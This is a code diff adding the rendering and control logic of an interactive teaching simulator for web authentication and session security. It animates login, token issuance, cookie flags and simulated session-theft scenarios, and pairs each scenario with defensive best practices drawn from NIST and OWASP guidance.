+  ctx.strokeStyle = 'rgba(30,41,59,0.4)'; ctx.lineWidth = 0.5;
+  for(var x=0;x<W;x+=40){ ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,H); ctx.stroke(); }
+  for(var y=0;y<H;y+=40){ ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(W,y); ctx.stroke(); }
+
+  drawZone(0.05*W, 0.08*H, 0.90*W, 0.75*H, 'AUTH FLOW', '#22d3ee');
+
+  var links = [
+    ['user','auth'], ['auth','store'], ['auth','api'],
+    ['api','siem'], ['attacker','user'], ['attacker','api']
+  ];
+  links.forEach(function(pair){
+    var na = STATE.nodes.find(function(n){return n.id===pair[0];});
+    var nb = STATE.nodes.find(function(n){return n.id===pair[1];});
+    if(!na || !nb) return;
+    ctx.beginPath();
+    ctx.moveTo(na.x, na.y);
+    ctx.lineTo(nb.x, nb.y);
+    ctx.strokeStyle = pair[0] === 'attacker' ? 'rgba(239,68,68,0.4)' : 'rgba(34,211,238,0.3)';
+    ctx.lineWidth = 1.5;
+    ctx.setLineDash(pair[0] === 'attacker' ? [4,4] : []);
+    ctx.stroke();
+    ctx.setLineDash([]);
+  });
+
+  STATE.events.forEach(function(e){
+    if(e.type === 'packet'){
+      var px = e.from.x + (e.to.x - e.from.x) * e.t;
+      var py = e.from.y + (e.to.y - e.from.y) * e.t;
+      ctx.save();
+      ctx.shadowColor = e.color; ctx.shadowBlur = 8;
+      ctx.fillStyle = e.color;
+      ctx.beginPath(); ctx.arc(px, py, e.size, 0, Math.PI*2); ctx.fill();
+      if(e.label){
+        ctx.font = '7px "Courier New",monospace';
+        ctx.fillStyle = e.color; ctx.textAlign = 'center';
+        ctx.fillText(e.label, px, py - 8);
+      }
+      ctx.restore();
+    }
+  });
+
+  STATE.nodes.forEach(function(n){
+    drawIcon(n.icon, n.x, n.y, n.color, n.glow, n.blink, n.label, n.ip);
+  });
+
+  // Info panel
+  if(STATE.phaseIdx > 0){
+    var a = ATTACKS[STATE.weak];
+    ctx.save();
+    var ax = 0.05*W, ay = H - 150, aw = 0.55*W, ah = 120;
+    ctx.fillStyle = 'rgba(10,20,30,0.9)';
+    ctx.strokeStyle = '#22d3ee';
+    ctx.lineWidth = 1.5;
+    ctx.fillRect(ax, ay, aw, ah);
+    ctx.strokeRect(ax, ay, aw, ah);
+    ctx.font = 'bold 10px "Courier New",monospace';
+    ctx.fillStyle = '#22d3ee';
+    ctx.textAlign = 'left';
+    ctx.fillText('\u25B8 ' + a.title, ax + 8, ay + 16);
+    ctx.font = '9px "Courier New",monospace';
+    ctx.fillStyle = '#cbd5e1';
+    ctx.fillText('Auth: ' + STATE.auth.toUpperCase() + ' | Entropy: ' + STATE.entropy + ' bits | TTL: ' + STATE.ttl + 'm', ax + 8, ay + 36);
+    ctx.fillText('Rotation: ' + STATE.rotation + 'm | Flags: ' + STATE.flags + '/4', ax + 8, ay + 52);
+    ctx.fillStyle = STATE.fixation === 'VULNERABLE' ? '#ef4444' : '#4ade80';
+    ctx.fillText('Session fixation: ' + STATE.fixation, ax + 8, ay + 68);
+    ctx.fillStyle = STATE.xss === 'YES' ? '#ef4444' : '#4ade80';
+    ctx.fillText('XSS steal: ' + STATE.xss + ' | CSRF: ' + STATE.csrf, ax + 8, ay + 84);
+    ctx.fillStyle = STATE.posture === 'STRONG' ? '#4ade80' : '#fcd34d';
+    ctx.fillText('Posture: ' + STATE.posture, ax + 8, ay + 100);
+    ctx.restore();
+  }
+
+  ctx.save();
+  ctx.font = '8px "Courier New",monospace';
+  ctx.fillStyle = 'rgba(100,116,139,0.6)';
+  ctx.textAlign = 'left';
+  ctx.fillText('Session ID: CSPRNG + 128+ bits entropy', 12, H - 74);
+  ctx.fillText('Cookies: Secure + HttpOnly + SameSite=Lax/Strict', 12, H - 62);
+  ctx.fillText('JWT: enforce alg, verify signature, short TTL, revocable', 12, H - 50);
+  ctx.fillText('Rotate on login + privilege change; invalidate server-side', 12, H - 38);
+  ctx.fillText('NIST SP 800-63B (AAL1-3) \u00B7 OWASP A07:2021 \u00B7 FIDO2', 12, H - 26);
+  ctx.restore();
+}
+
+function drawZone(x, y, w, h, label, color){
+  ctx.save();
+  ctx.strokeStyle = color; ctx.globalAlpha = 0.25; ctx.lineWidth = 1;
+  ctx.setLineDash([6,4]); ctx.strokeRect(x, y, w, h);
+  ctx.globalAlpha = 0.6;
+  ctx.font = 'bold 9px "Courier New",monospace';
+  ctx.fillStyle = color; ctx.textAlign = 'left';
+  ctx.fillText(label, x + 6, y + 14);
+  ctx.restore();
+}
+
+function updateBadges(){
+  document.getElementById('badgeAuth').textContent = STATE.auth.toUpperCase();
+  document.getElementById('badgeWeak').textContent = STATE.weak.toUpperCase();
+  document.getElementById('badgeStatus').textContent = STATE.running ? 'TESTING' : (STATE.phaseIdx >= 6 ? 'COMPLETE' : 'IDLE');
+  document.getElementById('badgeVerdict').textContent = STATE.posture;
+
+  document.getElementById('mEntropyVal').textContent = STATE.entropy;
+  document.getElementById('mTTLVal').textContent = STATE.ttl + 'm';
+  var crack = STATE.entropy >= 128 ? '10^10 yr' : STATE.entropy >= 64 ? '10^5 yr' : STATE.entropy >= 40 ? '10 days' : 'seconds';
+  document.getElementById('mCrackVal').textContent = crack;
+  document.getElementById('mFixationVal').textContent = STATE.fixation;
+  document.getElementById('mXSSVal').textContent = STATE.xss;
+  document.getElementById('mCSRFVal').textContent = STATE.csrf;
+  document.getElementById('mFlagsVal').textContent = STATE.flags + '/4';
+  document.getElementById('mDefenseVal').textContent = STATE.posture;
+
+  document.getElementById('mEntropy').className = 'metric' + (STATE.entropy >= 128 ? ' cyan' : ' warn');
+  document.getElementById('mFlags').className = 'metric' + (STATE.flags >= 4 ? ' ok' : STATE.flags >= 2 ? ' warn' : ' bad');
+  document.getElementById('mXSS').className = 'metric' + (STATE.xss === 'YES' ? ' bad' : ' ok');
+  document.getElementById('mCSRF').className = 'metric' + (STATE.csrf === 'VULN' ? ' bad' : ' ok');
+  document.getElementById('mDefense').className = 'metric' + (STATE.posture === 'STRONG' ? ' ok' : STATE.posture === 'MEDIUM' ? ' warn' : ' bad');
+}
+
+function advancePhase(){
+  if(STATE.phaseIdx >= PHASES.length){
+    STATE.running = false;
+    return;
+  }
+  var phase = PHASES[STATE.phaseIdx];
+  PHASES.forEach(function(p,i){
+    var el = document.getElementById('ap-' + p);
+    if(!el) return;
+    el.className = 'auth-phase';
+    if(i < STATE.phaseIdx) el.classList.add('done');
+    else if(i === STATE.phaseIdx && STATE.running) el.classList.add('active');
+  });
+
+  var a = ATTACKS[STATE.weak];
+
+  switch(phase){
+    case 'LOGIN':
+      spawnPacket('user','auth','#3b82f6','POST /login',0.03);
+      addFeed('LOGIN', 'User submits credentials over TLS. Server validates: password (Argon2id hash), MFA (TOTP or WebAuthn), rate limit (5/min per IP + account lockout). ' + (STATE.auth === 'webauthn' ? 'WebAuthn: hardware-backed public-key challenge/response — phishing-resistant.' : 'Server-side comparison with constant-time to prevent timing attacks.'), 'info');
+      break;
+
+    case 'ISSUE':
+      spawnPacket('auth','user','#22d3ee','SET TOKEN',0.03);
+      var method = STATE.auth.indexOf('jwt') === 0 ? 'JWT' : STATE.auth === 'session' ? 'opaque session ID' : STATE.auth.toUpperCase();
+      addFeed('ISSUE', 'Auth server issues ' + method + ' with ' + STATE.entropy + ' bits entropy, TTL ' + STATE.ttl + ' minutes. ' + (STATE.auth.indexOf('jwt') === 0 ? 'JWT signed with ' + (STATE.auth === 'jwt-hs' ? 'HS256 (shared secret)' : 'RS256 (asymmetric key)') + '. Claims: sub, role, exp, iat, jti.' : 'Session stored in Redis with TTL; cookie holds only the ID.'), 'ok');
+      addCommandFeed('curl -X POST https://login.example-corp/auth -d "user=alice&pass=***"',
+        '{\n  "token": "' + STATE.token.substring(0, 60) + '...",\n  "expires_in": ' + (STATE.ttl * 60) + ',\n  "type": "Bearer"\n}');
+      break;
+
+    case 'STORE':
+      addFeed('STORE', 'Client stores token in ' + (STATE.httpOnly ? 'HttpOnly cookie (invisible to JS) ' : 'localStorage (readable by JS — vulnerable to XSS) ') + (STATE.secure ? '+ Secure flag (HTTPS only) ' : '') + (STATE.sameSite ? '+ SameSite=Strict ' : '') + '. Best practice: HttpOnly + Secure + SameSite=Strict cookie for session, with CSRF token if SameSite=Lax.', STATE.httpOnly ? 'ok' : 'warn');
+      break;
+
+    case 'VALIDATE':
+      spawnPacket('user','api','#22d3ee','Bearer token',0.03);
+      addFeed('VALIDATE', 'API server validates: ' + (STATE.auth.indexOf('jwt') === 0 ? 'JWT signature with key, algorithm matches expected (' + (STATE.auth === 'jwt-hs' ? 'HS256' : 'RS256') + '), claims are current (exp, nbf, aud, iss). Server MUST enforce algorithm — never trust client-supplied alg.' : 'Session ID lookup in Redis; TTL check; revoked check.'), 'ok');
+      break;
+
+    case 'ROTATE':
+      if(STATE.rotation > 0){
+        addFeed('ROTATE', 'Session rotation every ' + STATE.rotation + ' minutes: issue new ID/token, invalidate previous. This limits damage from stolen tokens (window = rotation interval). Refresh tokens (OAuth2) typically rotate every use (one-time use) to detect theft.', 'ok');
+      } else {
+        addFeed('ROTATE', 'NO ROTATION — session ID/token valid for full TTL. If stolen, attacker has the full window.', 'warn');
+      }
+      break;
+
+    case 'LOGOUT':
+      addFeed('LOGOUT', 'Logout: ' + (STATE.weak === 'nologout' ? 'SERVER DOES NOT INVALIDATE — only client cookie is deleted. Stolen token remains valid until TTL.' : 'Server invalidates session in store + clears client cookie. JWT: added to revocation list (or rely on short TTL + refresh invalidation).'), STATE.weak === 'nologout' ? 'error' : 'ok');
+      break;
+  }
+  STATE.phaseIdx++;
+}
+
+function resetAll(){
+  STATE.running = false;
+  STATE.phaseIdx = 0;
+  STATE.posture = 'WEAK';
+  STATE.fixation = 'SAFE';
+  STATE.xss = 'NO';
+  STATE.csrf = 'SAFE';
+  STATE.flags = (STATE.secure ? 1 : 0) + (STATE.httpOnly ? 1 : 0) + (STATE.sameSite ? 1 : 0) + (STATE.domain ? 1 : 0);
+  STATE.events = [];
+  PHASES.forEach(function(p){ var el = document.getElementById('ap-' + p); if(el) el.className = 'auth-phase'; });
+  STATE.nodes.forEach(function(n){ n.glow = 0; });
+  addFeed('RESET', 'Auth state cleared.', 'info');
+  termWrite('reset --all\n[+] Session table cleared');
+}
+
+document.getElementById('authSelect').addEventListener('change', function(e){
+  STATE.auth = e.target.value;
+  addFeed('AUTH', 'Auth mechanism: ' + STATE.auth.toUpperCase() + '.', 'info');
+});
+document.getElementById('weakSelect').addEventListener('change', function(e){
+  STATE.weak = e.target.value;
+  var a = ATTACKS[STATE.weak];
+  addFeed('WEAKNESS', a.title + '. ' + a.detail, 'warn');
+});
+document.getElementById('tokenInput').addEventListener('input', function(e){ STATE.token = e.target.value; });
+
+document.getElementById('ttlSlider').addEventListener('input', function(e){
+  STATE.ttl = parseInt(e.target.value);
+  document.getElementById('ttlVal').textContent = e.target.value;
+});
+document.getElementById('entSlider').addEventListener('input', function(e){
+  STATE.entropy = parseInt(e.target.value);
+  document.getElementById('entVal').textContent = e.target.value;
+});
+document.getElementById('rotSlider').addEventListener('input', function(e){
+  STATE.rotation = parseInt(e.target.value);
+  document.getElementById('rotVal').textContent = e.target.value;
+});
+
+document.getElementById('secureBtn').addEventListener('click', function(){
+  STATE.secure = !STATE.secure;
+  this.classList.toggle('active', STATE.secure);
+  if(STATE.secure) addFeed('COOKIE', 'Secure flag set: cookie only sent over HTTPS. Protects against MITM on plaintext channels.', 'ok');
+  else addFeed('COOKIE', 'Secure flag REMOVED — cookie can be sent over HTTP.', 'warn');
+});
+document.getElementById('httpOnlyBtn').addEventListener('click', function(){
+  STATE.httpOnly = !STATE.httpOnly;
+  this.classList.toggle('active', STATE.httpOnly);
+  if(STATE.httpOnly) addFeed('COOKIE', 'HttpOnly flag set: cookie invisible to document.cookie. Defends against XSS-based session theft.', 'ok');
+  else addFeed('COOKIE', 'HttpOnly REMOVED — XSS can steal session.', 'error');
+});
+document.getElementById('sameSiteBtn').addEventListener('click', function(){
+  STATE.sameSite = !STATE.sameSite;
+  this.classList.toggle('active', STATE.sameSite);
+  if(STATE.sameSite) addFeed('COOKIE', 'SameSite=Strict set: cookie not sent on cross-site requests. Blocks CSRF.', 'ok');
+  else addFeed('COOKIE', 'SameSite not set — CSRF protection depends on token.', 'warn');
+});
+document.getElementById('domainBtn').addEventListener('click', function(){
+  STATE.domain = !STATE.domain;
+  this.classList.toggle('active', STATE.domain);
+  if(STATE.domain) addFeed('COOKIE', 'Domain scope set — cookie shared across subdomains. Careful: a compromised subdomain can steal it.', 'warn');
+  else addFeed('COOKIE', 'Domain scope: host-only (safer default).', 'ok');
+});
+
+document.getElementById('startBtn').addEventListener('click', function(){
+  if(STATE.running) return;
+  STATE.running = true;
+  STATE.phaseIdx = 0;
+  STATE.nodes.forEach(function(n){ n.glow = 0; });
+  addFeed('TEST', 'Testing auth flow: ' + STATE.auth.toUpperCase() + ' with weakness ' + ATTACKS[STATE.weak].title, 'info');
+  var interval = setInterval(function(){
+    if(!STATE.running){ clearInterval(interval); return; }
+    advancePhase();
+    if(STATE.phaseIdx >= 6){ clearInterval(interval); STATE.running = false; }
+  }, 1200);
+});
+
+document.getElementById('stepBtn').addEventListener('click', function(){
+  if(!STATE.running){ STATE.running = true; STATE.phaseIdx = 0; }
+  advancePhase();
+});
+
+document.getElementById('resetBtn').addEventListener('click', resetAll);
+
+document.getElementById('stealBtn').addEventListener('click', function(){
+  var a = ATTACKS[STATE.weak];
+  addFeed('STEAL', 'Attempting session theft: ' + a.title + '. ' + a.detail, 'error');
+  var success = false;
+  if(STATE.weak === 'xss' && !STATE.httpOnly) success = true;
+  else if(STATE.weak === 'csrf' && !STATE.sameSite) success = true;
+  else if(STATE.weak === 'predictable' && STATE.entropy < 64) success = true;
+  else if(STATE.weak === 'fixation') success = true;
+  else if(STATE.weak === 'jwt-alg' || STATE.weak === 'jwt-weak') success = true;
+  else if(STATE.weak === 'noexpiry') success = true;
+  else if(STATE.weak === 'nologout') success = true;
+
+  if(success){
+    STATE.posture = 'WEAK';
+    addFeed('STEAL', 'SESSION HIJACKED. Attacker now has valid session for alice. Impact: full account takeover. See: ' + a.defense, 'error');
+    STATE.nodes.find(function(n){return n.id==='attacker';}).glow = 1;
+  } else {
+    STATE.posture = 'STRONG';
+    addFeed('STEAL', 'Defense held. HttpOnly + SameSite + entropy + rotation prevented theft.', 'ok');
+  }
+});
+
+document.getElementById('hardenBtn').addEventListener('click', function(){
+  STATE.secure = true;
+  STATE.httpOnly = true;
+  STATE.sameSite = true;
+  STATE.ttl = 15;
+  STATE.entropy = 256;
+  STATE.rotation = 5;
+  document.getElementById('secureBtn').classList.add('active');
+  document.getElementById('httpOnlyBtn').classList.add('active');
+  document.getElementById('sameSiteBtn').classList.add('active');
+  document.getElementById('ttlSlider').value = 15;
+  document.getElementById('ttlVal').textContent = '15';
+  document.getElementById('entSlider').value = 256;
+  document.getElementById('entVal').textContent = '256';
+  document.getElementById('rotSlider').value = 5;
+  document.getElementById('rotVal').textContent = '5';
+  STATE.posture = 'STRONG';
+  STATE.flags = 4;
+  addFeed('DEFENSE', 'Auth hardened: Secure + HttpOnly + SameSite=Strict cookies, 256-bit entropy, 15-minute TTL, 5-minute rotation, server-side revocation on logout. Consider: WebAuthn/FIDO2 for phishing-resistant MFA, Argon2id for password hashing, per-device sessions with device binding, anomalous login detection (impossible travel, new geo).', 'ok');
+});
+
+document.getElementById('teachingToggle').addEventListener('click', function(){
+  var on = this.classList.toggle('active');
+  this.textContent = on ? '\uD83D\uDCD6 TEACHING: ON' : '\uD83D\uDCD6 TEACHING: OFF';
+});
+document.getElementById('voiceToggle').addEventListener('click', function(){
+  VOICE.enabled = !VOICE.enabled;
+  this.classList.toggle('active', VOICE.enabled);
+  this.textContent = VOICE.enabled ? '\uD83D\uDD0A VOICE: ON' : 'VOICE: OFF';
+});
+
+window.addEventListener('load', boot);
+</script>
+</body>
+</html>
